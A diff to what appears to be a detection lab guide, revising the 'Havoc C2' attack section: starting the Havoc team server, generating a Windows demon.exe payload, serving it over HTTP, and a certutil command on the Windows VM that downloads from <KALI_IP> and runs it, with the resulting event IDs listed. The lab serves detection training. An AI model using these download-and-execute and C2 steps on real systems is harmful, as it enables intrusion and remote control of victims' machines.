@@ -10,18 +10,11 @@ All tools below are pre-installed on Kali except Havoc. Everything else (impacke
 
 ### Install Havoc (one-time)
 
-```bash
-sudo apt install -y golang mingw-w64 python3-dev python3-pip libfontconfig1
+See [installation/havoc.md](installation/havoc.md) for the full build steps.
 
-git clone https://github.com/HavocFramework/Havoc.git /opt/havoc
-cd /opt/havoc
-
-# Build team server
-cd teamserver && go mod download && go build -o havoc . && cd ..
-
-# Build client
-cd client && npm install && npm run build && cd ..
-```
+Binaries after install:
+- Team server: `/opt/havoc/teamserver/havoc`
+- Client GUI: `/opt/havoc/client/Havoc`
 
 ---
 
@@ -194,21 +187,24 @@ data.win.system.eventID: 7045
 
 ## Attack 4 — Havoc C2
 
-```bash
-# Start team server
-cd /opt/havoc
-sudo ./havoc server --profile ./profiles/havoc.yaotl -v
+Havoc is a C2 framework. Team server and client both run on Kali. The Windows VM only runs the demon (the generated payload that calls back to Kali). See [installation/havoc.md](installation/havoc.md) for setup.
 
-# Open client in second terminal
-./havoc client
+```bash
+# Terminal 1 — start team server (Kali)
+cd /opt/havoc
+sudo ./teamserver/havoc server --profile ./profiles/havoc.yaotl -v
+
+# Terminal 2 — open client GUI (Kali)
+/opt/havoc/client/Havoc
 ```
 
 In Havoc client:
 1. View → Listeners → Add — HTTP, Host: `<KALI_IP>`, Port: 80
-2. Attack → Payload → Generate — Windows EXE
-3. Save as `demon.exe` → move to `/tmp/`
+2. Attack → Payload → Generate — Windows EXE, select listener → save as `demon.exe`
 
 ```bash
+# Host payload on Kali
+cp demon.exe /tmp/
 python3 -m http.server 8080 --directory /tmp/
 ```
 
@@ -217,6 +213,8 @@ On Windows VM in cmd (as Admin):
 certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
 C:\Windows\Temp\demon.exe
 ```
+
+Demon runs → calls back to Kali → session appears in Havoc client.
 
 Events: 4688 (certutil + urlcache), 4688 (demon.exe spawned from cmd.exe)
 
